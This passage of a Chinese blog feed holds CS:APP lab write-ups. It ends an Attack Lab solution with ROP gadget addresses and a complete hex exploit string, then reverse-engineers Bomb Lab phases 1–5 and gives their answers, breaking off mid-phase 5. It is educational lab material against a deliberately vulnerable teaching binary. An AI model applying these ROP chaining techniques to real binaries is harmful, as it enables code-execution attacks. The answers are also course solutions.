%edx<code>的指令字节为:</code>89 c2<code>, 所以这一步的</code>gadget<code>地址为：</code>0x4019dd</p><p>(5) 第五步，将<code>%edx</code>的内容传送到<code>%ecx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000401a6e &lt;setval_167&gt;:<br>  401a6e: c7 07 89 d1 91 c3     movl   <span class="hljs-variable">$0xc391d189</span>,(%rdi)<br>  401a74: c3  <br><br></code></pre></td></tr></table></figure><p>movl %edx, %ecx<code>的指令字节为：</code>89 d1<code>，所以这一步的</code>gadget<code>地址为：</code>0x401a70</p><p>(6) 第六步，将<code>%ecx</code>的内容传送到<code>%esi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a11 <span class="hljs-tag">&lt;<span class="hljs-name">addval_436</span>&gt;</span>:<br>  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax<br>  401a17: c3                    retq <br><br></code></pre></td></tr></table></figure><p>movl %ecx, %esi<code>的指令字节为：</code>89 ce<code>, 所以这一步</code>gadget<code>地址为：</code>0x401a13</p><p>(7) 第七步，将栈顶 + 偏移量得到字符串的首地址传送到<code>%rax</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019d6 <span class="hljs-tag">&lt;<span class="hljs-name">add_xy</span>&gt;</span>:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq <br></code></pre></td></tr></table></figure><p>这一步的<code>gadget</code>地址为：<code>0x4019d6</code></p><p>(8) 将字符串首地址<code>%rax</code>传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>整个栈的结构如下：</p><p><img src="/2021/07/04/Attack_lab/1433829-cafcf76d35ef7ba1.png" alt="img"></p><p>所以要输入的字符串为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>保存在touch_5.txt中，执行指令：</p><p><img src="/2021/07/04/Attack_lab/image-20210412213042512.png" alt="image-20210412213042512"></p>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab3_bomblab</title>
    <link href="/2021/07/04/lab3_bomb_lab/"/>
    <url>/2021/07/04/lab3_bomb_lab/</url>
    
    <content type="html"><![CDATA[<h1 id="lab3-bomb-lab"><a href="#lab3-bomb-lab" class="headerlink" title="lab3 bomb lab"></a>lab3 bomb lab</h1><h2 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1. phase_1"></a>1. phase_1</h2><ul><li><strong>汇编代码：</strong> </li></ul><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316165036780.png" alt="image-20210316165036780"></p><ul><li><p><strong>指令思路:</strong>   </p><p>将地址$0x402400存到%esi中</p><p>调用函数<strings_not_equal>将用户输入的内容与寄存器%esi中的值比较，结果返回至%eax，若相同，则返回0，反之返回1；</strings_not_equal></p><p>test  将两个数相与，若为0，则ZF标志位变为1，反之ZF为0；</p><p>若ZF为1，则je指令跳转，跳过 了explode_bomb函数，破解成功，反之不跳转，爆炸。</p></li><li><p><strong>解决方法:</strong></p><p>因此地址$0x402400中存储的值即为我们需要知道的密码</p><p>运用GDB调试工具输入指令 :</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>/s <span class="hljs-number">0</span>x<span class="hljs-number">402400</span><br></code></pre></td></tr></table></figure></li></ul><p>可得密码为：Border relations with Canada have never been better.</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210315211917616.png" alt="image-20210315211917616"></p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316171734306.png" alt="image-20210316171734306"></p><h2 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2. phase_2"></a>2. phase_2</h2><ul><li><p><strong>汇编代码与指令思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000400efc &lt;phase_2&gt;:<br>  400efc:55                   push   %rbp*备份<br>  400efd:53                   push   %rbx<br>  400efe:48 83 ec 28          sub    $0x28,%rsp  *开辟40字节空间<br>  400f02:48 89 e6             mov    %rsp,%rsi*<br>  400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;*读入六个数字，首个数字存放在栈顶%rsp<br>  400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)*判断a[0]是否和1相等，不相等直接爆炸<br>  400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;*相等则跳到$0x400f30<br>  400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f15:eb 19                jmp    400f30 &lt;phase_2+0x34&gt;<br>  400f17:8b 43 fc             mov    -0x4(%rbx),%eax*将当前数字的上一个数字存入%eax中<br>  400f1a:01 c0                add    %eax,%eax*将%eax存放的元素乘二<br>  400f1c:39 03                cmp    %eax,(%rbx)*与当前数字判断<br>  400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;*相等则跳到$0x400f25，否则爆炸<br>  400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f25:48 83 c3 04          add    $0x4,%rbx*取下一数字<br>  400f29:48 39 eb             cmp    %rbp,%rbx*与最后一个元素比较<br>  400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;*不相等则回到$400f17，继续乘二判断操作<br>  400f2e:eb 0c                jmp    400f3c &lt;phase_2+0x40&gt;*相等则结束，跳转进行清理栈区操作<br>  400f30:48 8d 5c 24 04       lea    0x4(%rsp),%rbx*将a[1]地址赋给%rba<br>  400f35:48 8d 6c 24 18       lea    0x18(%rsp),%rbp*将a[5]地址赋给%rbp,用作终止条件<br>  400f3a:eb db                jmp    400f17 &lt;phase_2+0x1b&gt;*直接跳转到$400f17<br>  400f3c:48 83 c4 28          add    $0x28,%rsp<br>  400f40:5b                   pop    %rbx<br>  400f41:5d                   pop    %rbp<br>  400f42:c3                   retq    <br></code></pre></td></tr></table></figure></li><li><p><strong>解决方法</strong></p><p>由上述指令思路可知，第一个数为1，且之后每个数都会是前一个的两倍，否则就会爆炸。</p><p>所以密码为：1 2 4 8 16 32</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316171653420.png" alt="image-20210316171653420"></p></li></ul><h2 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3. phase_3"></a>3. phase_3</h2><ul><li><p><strong>汇编代码</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400f43</span> &lt;phase_<span class="hljs-number">3</span>&gt;:<br>  <span class="hljs-attribute">400f43</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400f47</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx*sscanf第四个参数，即输入的第二个数<br>  <span class="hljs-attribute">400f4c</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx*sscanf第三个参数，即输入的第一个数<br>  <span class="hljs-attribute">400f51</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi*第二个参数<br>  <span class="hljs-attribute">400f56</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax*第一个参数<br>  <span class="hljs-attribute">400f5b</span>:e<span class="hljs-number">8</span> <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">400f60</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax*%eax会返回参数个数<br>  <span class="hljs-attribute">400f63</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">400</span>f<span class="hljs-number">6</span>a &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>&gt;*大于<span class="hljs-number">1</span>才继续，否则爆炸<br>  <span class="hljs-attribute">400f65</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">0</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f6a</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)<br>  <span class="hljs-attribute">400f6f</span>:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400</span>fad &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a&gt;<br>  <span class="hljs-attribute">400f71</span>:<span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%eax<br>  <span class="hljs-attribute">400f75</span>:ff <span class="hljs-number">24</span> c<span class="hljs-number">5</span> <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>(,%rax,<span class="hljs-number">8</span>)<br>  <span class="hljs-attribute">400f7c</span>:b<span class="hljs-number">8</span> cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xcf,%eax<br>  <span class="hljs-attribute">400f81</span>:eb <span class="hljs-number">3</span>b                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f83</span>:b<span class="hljs-number">8</span> c<span class="hljs-number">3</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>c<span class="hljs-number">3</span>,%eax<br>  <span class="hljs-attribute">400f88</span>:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f8a</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">100</span>,%eax<br>  <span class="hljs-attribute">400f8f</span>:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f91</span>:b<span class="hljs-number">8</span> <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">185</span>,%eax<br>  <span class="hljs-attribute">400f96</span>:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f98</span>:b<span class="hljs-number">8</span> ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xce,%eax<br>  <span class="hljs-attribute">400f9d</span>:eb <span class="hljs-number">1</span>f                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f9f</span>:b<span class="hljs-number">8</span> aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>aa,%eax<br>  <span class="hljs-attribute">400fa4</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fa6</span>:b<span class="hljs-number">8</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">147</span>,%eax<br>  <span class="hljs-attribute">400fab</span>:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fad</span>:e<span class="hljs-number">8</span> <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fb2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400fb7</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fb9</span>:b<span class="hljs-number">8</span> <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">137</span>,%eax<br>  <span class="hljs-attribute">400fbe</span>:<span class="hljs-number">3</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0</span>xc(%rsp),%eax<br>  <span class="hljs-attribute">400fc2</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>fc<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">86</span>&gt;<br>  <span class="hljs-attribute">400fc4</span>:e<span class="hljs-number">8</span> <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fc9</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400fcd</span>:c<span class="hljs-number">3</span>                   retq    <br><br></code></pre></td></tr></table></figure></li><li><p><strong>指令思路与解决方法</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175426399.png"></p><p>这部分代码读入参数</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316174708562.png" alt="image-20210316174708562"></p><p>这部分代码先判断sscanf的参数个数返回值%eax是否大于1，大于继续，否则爆炸</p><p>在判断输入的第一个数字是否小于7，小于继续，否则爆炸。</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175205802.png" alt="image-20210316175205802"></p><p>这部分代码会跳转至M[0x402470+%rax*8]所在地址,</p><p>用gdb指令查看0x402470 处的值<img src="/2021/07/04/lab3_bomb_lab/image-20210316175832024.png" alt="image-20210316175832024"></p><p>通过观察可以发现，jump之后的指令都是功能类似的重复指令，因此我们只需选择一组跳转即可</p><p>因为0x402470 处的值即为jmpq后第一个mov指令所在地址，该操作会将0xcf(207)赋值给%eax。因此我们可以取第一个数为0，第二个数为207。因为之后的cmp会比较%eax的值和我们输入的第二个数，不相同会爆炸</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316180239126.png" alt="image-20210316180239126"></p><p>故密码可为：0 207或2 707等等，答案不唯一</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316181230534.png" alt="image-20210316181230534"></p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316181134846.png" alt="image-20210316181134846"></p></li></ul><h2 id="4-phase-4"><a href="#4-phase-4" class="headerlink" title="4. phase_4"></a>4. phase_4</h2><ul><li><p><strong>汇编代码：</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204437370.png" alt="image-20210316204437370"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204525714.png" alt="image-20210316204525714"></p></li><li><p><strong>指令思路和解决方法：</strong></p><p>首先我们发现这还是和phase_3一样传入2参数，可以通过查看0x4025cf得知；</p><p>之后将第一个数字和0xe比较，如果小于等于就跳转，否则爆炸；</p><p>跳转后来到mov指令，赋值后：%edx=0xe,%esi=0x0，%edi=参数x<del>1</del>;之后调用函数func4()，可知前面三个寄存器存放函数func4的三个参数；</p><p>来到func4里，%eax经过mov指令后变成0xe，sub后保持不变，之后将%eax的值赋给%ecx, shr为将%ecx逻辑右移31位，%ecx=0;</p><p>sar无移位参数，默认右移一位，%eax=0x7;</p><p>lea:%ecx=%rax+%rsi*1=0x7+0*1=0x7;</p><p>之后将参数x<del>1</del>与%ecx比较，即0x7比较，若小于等于且大于等于则结束，且返回值%eax=0；否则将参数x<del>1</del>－1后继续调用func4。</p><p>回到phase_4，可知要使func4返回值为0，否则就会爆炸，所以当x1为7时恰好可以使返回值为0，符合；</p><p>之后很容易得到必须要使得第二个数为0，否则就会爆炸；</p><p>故密码为：7 0</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316212318867.png" alt="image-20210316212318867"></p></li></ul><h2 id="5-phase-5"><a href="#5-phase-5" class="headerlink" title="5. phase_5"></a>5. phase_5</h2><ul><li><p><strong>汇编代码与指令思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401062 &lt;phase_5&gt;:<br>  401062:53                   push   %rbx<br>  401063:48 83 ec 20          sub    $0x20,%rsp<br>  401067:48 89 fb             mov    %rdi,%rbx*将我们输入的传给%rdx<br>  40106a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>  401071:00 00 <br>  401073:48 89 44 24 18       mov    %rax,0x18(%rsp)<br>  401078:31 c0                xor    %eax,%eax*重置%rax为0<br>  40107a:e8 9c 02 00 00       callq  40131b &lt;string_length&gt;*判断长度<br>  40107f:83 f8 06             cmp    $0x6,%eax<br>  401082:74 4e                je     4010d2 &lt;phase_5+0x70&gt;*不为6则爆炸<br>  401084:e8 b1 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401089:eb 47                jmp    4010d2 &lt;phase_5+0x70&gt;<br>  40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx<br>  40108f:88 0c 24             mov    %cl,(%rsp)<br>  401092:48 8b 14 24          mov    (%rsp),%rdx*1.上述三个操作将我们输入的字符的低四位传给%rdx<br>  401096:83 e2 0f             and    $0xf,%edx<br>  401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx*2.将%rdx的值作为偏移量，取内存中的M[0x4024b0+%rdx]的值<br>  4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)*取出来的字符存到后面的地址中<br>  4010a4:48 83 c0 01          add    $0x1,%rax*将上述操作重复6次<br>  4010a8:48 83 f8 06          cmp    $0x6,%rax<br>  4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;<br>  4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)<br>  4010b3:be 5e 24 40 00       mov    $0x40245e,%esi<br>  4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi*将取出来的6个字符存到%rdi中<br>  4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;*与0x40245e地址中值比较，不相等就会爆炸<br>  4010c2:85 c0                test   %eax,%eax<br>  4010c4:74 13                je     4010d9 &lt;phase_5+0x77&gt;<br>  4010c6:e8 6f 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4010cb:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)<br>  4010d0:eb 07                jmp    4010d9 &lt;phase_5+0x77&gt;<br>  4010d2:b8 00 00 00 00       mov    $0x0,%eax<br>  4010d7:eb b2                jmp    40108b &lt;phase_5+0x29&gt;<br>  4010d9:48 8b 44 24 18       mov    0x18(%rsp),%rax<br>  4010de:64 48 33 04 25 28 00 xor    %fs:0x28,%rax<br>  4010e5:00 00 <br>  4010e7:74 05                je     4010ee &lt;phase_5+0x8c&gt;<br>  4010e9:e8 42 fa ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;<br>  4010ee:48 83 c4 20          add    $0x20,%rsp<br>  4010f2:5b                   pop    %rbx<br>  4010f3:c3                   retq  <br></code></pre></td></tr></table></figure></li><li><p><strong>解决方法：</strong></p><p>上述指令简而言之就是我们输入6个字符，然后取这6个字符的后4位作为地址索引，取内存中的M[0x4024b0+%rdx]的值，存到另一个寄存器中，然后将这个值与M[0x40245e]中的值比较，相等则结束，否则爆炸；</p><p>所以我们先查看内存0x4024b0为起始的地址中存放的元素：</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317085034624.png" alt="image-20210317085034624"></p><p>然后查看0x40245e中的值：</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317085132914.png" 